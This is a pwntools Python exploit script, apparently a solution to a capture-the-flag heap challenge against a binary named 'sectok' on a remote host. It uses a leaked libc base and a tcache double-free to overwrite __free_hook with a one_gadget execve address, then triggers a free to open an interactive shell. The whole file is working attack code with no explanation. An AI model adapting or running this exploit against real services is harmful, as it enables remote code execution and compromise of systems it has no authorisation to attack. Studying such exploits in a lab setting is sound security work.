
from pwn import *
import os
import sys
import time

elf = ELF('./sectok')
libc = ELF('./libc.so.6')

#access = remote('192.168.191.61',20202)
access= remote('10.21.232.3',20202)

def generate_token(): 
	access.sendlineafter("Action: ", 'g')  
	access.sendlineafter("token: ", 'PQRS')  
def remove_token(id):
	access.sendlineafter("Action: ", 'd')  
	access.sendlineafter("token: ", str(id).encode())  

access.recvuntil(b'base: ')

libc_address = access.recvuntil(b'\n').decode()
libc_address = libc_address.replace('\n', '').strip()
libc_base_value = int(libc_address,16)


__free_hook = libc_base_value + libc.symbols["__free_hook"]
__malloc_hook = libc_base_value + libc.symbols["__malloc_hook"]
#exec4 = libc_base_value + int(0x10a2fc)
#exec1 = libc_base_value + int(0x4f29e)
#exec2 = libc_base_value + int(0x4f2a5)
exec3 = libc_base_value + int(0x4f302)

#log.info("libc base = "+libc_address)
#log.info("execve = "+ str(hex(exec4)))
#log.info("free_hook = "+str(hex(__free_hook)))

for i in range(9):
    generate_token()

for i in range(7):
    remove_token(i)

remove_token(7)
remove_token(8)
remove_token(7)

for i in range(7):
    generate_token() 

access.sendlineafter("Action: ", 'g')  
access.sendlineafter("token: ", p64(__free_hook))

generate_token()
generate_token()

access.sendlineafter("Action: ", 'g')  
access.sendlineafter("token: ", p64(exec3))

remove_token(2)
access.interactive()

